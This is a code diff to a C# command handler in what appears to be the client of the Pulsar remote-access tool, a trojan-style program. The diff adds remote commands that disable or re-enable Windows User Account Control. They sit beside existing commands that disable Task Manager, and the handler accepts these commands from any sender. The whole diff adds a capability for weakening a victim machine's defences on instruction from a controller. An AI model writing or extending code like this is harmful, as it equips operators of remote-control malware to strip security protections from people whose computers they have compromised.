@@ -4,13 +4,14 @@ using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Messages.QuickCommands;
 using System.Diagnostics;
 using Pulsar.Client.Helper.TaskManager;
+using Pulsar.Client.Helper.UAC;
 
 namespace Pulsar.Client.Messages
 {
 
     public class QuickCommandHandler : IMessageProcessor
     {
-        public bool CanExecute(IMessage message) => message is DoSendQuickCommand || message is DoEnableTaskManager || message is DoDisableTaskManager;
+        public bool CanExecute(IMessage message) => message is DoSendQuickCommand || message is DoEnableTaskManager || message is DoDisableTaskManager || message is DoDisableUAC || message is DoEnableUAC;
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -27,6 +28,14 @@ namespace Pulsar.Client.Messages
                     break;
 
                 case DoDisableTaskManager msg:
+                    Execute(sender, msg);
+                    break;
+
+                case DoDisableUAC msg:
+                    Execute(sender, msg);
+                    break;
+
+                case DoEnableUAC msg:
                     Execute(sender, msg);
                     break;
             }
@@ -58,6 +67,18 @@ namespace Pulsar.Client.Messages
         {
             client.Send(new SetStatus { Message = "Task Manager Disabled" });
             TaskManager.Disable();
+        }
+
+        private void Execute(ISender client, DoDisableUAC message)
+        {
+            client.Send(new SetStatus { Message = "UAC Disabled. Requires Restart" });
+            UACToggle.DisableUAC();
+        }
+
+        private void Execute(ISender client, DoEnableUAC message)
+        {
+            client.Send(new SetStatus { Message = "UAC Enabled. Requires Restart" });
+            UACToggle.EnableUAC();
         }
     }
 }
